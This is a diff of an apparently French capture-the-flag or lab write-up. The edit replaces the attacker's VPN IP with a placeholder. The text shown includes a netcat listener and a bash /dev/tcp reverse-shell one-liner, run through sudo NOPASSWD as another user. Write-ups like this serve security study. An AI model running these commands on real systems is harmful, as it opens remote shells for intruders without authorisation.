@@ -10,10 +10,10 @@
 
 ---
 
-## 1. Reverse shell (confort d'exploitation)
+## 1. Reverse shell
 
 Pour travailler plus confortablement en tant que `titouan`, on ouvre un listener sur la
-machine attaquante (IP VPN `10.8.0.246`) :
+machine attaquante :
 
 ```bash
 nc -lvnp 4444
@@ -23,7 +23,7 @@ Puis on envoie le payload via le Shell Panel (accessible en `www-data`, qui peut
 des commandes en tant que `titouan` grâce au `sudo NOPASSWD: ALL`) :
 
 ```bash
-sudo -u titouan bash -c "bash -i >& /dev/tcp/10.8.0.246/4444 0>&1"
+sudo -u titouan bash -c "bash -i >& /dev/tcp/<IP>/4444 0>&1"
 ```
 
 Résultat : **shell interactif obtenu directement en tant que `titouan`**.
